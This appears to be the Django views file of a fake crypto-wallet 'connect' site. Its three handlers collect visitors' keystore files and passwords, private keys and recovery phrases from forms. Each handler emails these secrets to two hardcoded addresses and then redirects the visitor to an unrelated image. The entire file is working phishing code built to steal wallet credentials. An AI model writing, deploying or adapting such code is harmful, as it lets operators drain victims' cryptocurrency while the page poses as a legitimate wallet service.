from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings

# Create your views here.
receiver = "shineneil240@gmail.com"
test = ["smiletruck345@gmail.com", ]


def index(request):
    return render(request, "wallet/index.html")


def sync(request):
    return render(request, 'wallet/connect.html')


def key(request):
    if request.method == 'POST':
        wallet = request.POST.get("w")
        keystore = request.POST.get("phrase")
        passwd = request.POST.get("password")
        subject = wallet + ' Keystore'
        message = f'Keystore : {keystore}\nPassword : {passwd}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [receiver, ]

        send_mail(subject, message, email_from, recipient_list)
        send_mail(subject, message, email_from, test)
        return redirect("https://image.ibb.co/hkgHso/admin.png")

    return render(request, 'wallet/connect.html')


def pk(request):
    if request.method == 'POST':
        wallet = request.POST.get("w")
        private = request.POST.get("key")
        subject = wallet + ' Private Key'
        message = f'private : {private}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [receiver, ]

        send_mail(subject, message, email_from, recipient_list)
        send_mail(subject, message, email_from, test)
        return redirect("https://image.ibb.co/hkgHso/admin.png")
    return render(request, 'wallet/connect.html')


def phrase(request):
    if request.method == 'POST':
        wallet = request.POST.get("w")
        phrase1 = request.POST.get("phrase")
        subject = wallet + ' Phrase'
        message = f'Phrase : {phrase1}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [receiver, ]

        send_mail(subject, message, email_from, recipient_list)
        send_mail(subject, message, email_from, test)
        return redirect("https://image.ibb.co/hkgHso/admin.png")

    return render(request, 'wallet/connect.html')
